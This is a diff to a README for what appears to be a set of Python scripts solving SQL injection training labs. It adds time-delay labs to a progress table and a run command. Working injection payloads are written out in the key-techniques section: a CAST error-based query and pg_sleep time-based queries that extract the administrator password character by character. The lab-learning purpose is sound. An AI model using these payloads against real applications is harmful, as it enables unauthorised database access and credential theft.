@@ -13,11 +13,14 @@ SQL injection (SQLi) is a technique where attackers insert malicious SQL command
 | 6 | Blind SQL injection with conditional responses | SQLi | ✅ Solved |
 | 7 | Blind SQL injection with conditional errors | SQLi | ✅ Solved |
 | 8 | Visible error-based SQL injection | SQLi | ✅ Solved |
+| 9 | Blind SQL injection with time delays | SQLi | ✅ Solved |
+| 10 | Blind SQL injection with time delays and information retrieval | SQLi | ✅ Solved |
 
 
 ## Built with
 - Python 3
 - requests module
+- time module
 
 ## How to run
 
@@ -32,6 +35,7 @@ SQL injection (SQLi) is a technique where attackers insert malicious SQL command
 ``` 
     python SQLi/blind_sqli.py
     python SQLi/blind_sqli_error_based.py
+    python SQLi/blind_sqli_time_delays.py
 ```
 
 4. Enter the lab URL (with a category e.g. /filter?category=Gifts), TrackingId, and session ID when prompted
@@ -39,13 +43,18 @@ SQL injection (SQLi) is a technique where attackers insert malicious SQL command
 ## Key Techniques
 
 **Lab 8 — Visible error-based SQL injection**
-
 Manual testing with Burp due to character limits and variable error formats.
-
 **Payload:**
 ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
 **Key insight:** Delete the original TrackingId value to free up character space for longer payloads. Error message leaks the password directly.
+
+**Lab 9 — Blind SQL injection with time delays**
+Uses pg_sleep() to create time-based oracle. Response time > 2 seconds = true condition.
+Binary search on ASCII values extracts password character by character.
+**Payload:**
+'||(CASE WHEN (LENGTH((SELECT password from users where username='administrator')) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END)||'
+'||(CASE WHEN (ASCII(SUBSTR((SELECT password FROM users where username='administrator'), {i}, 1)) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END)||'
 
 
 ## Updates
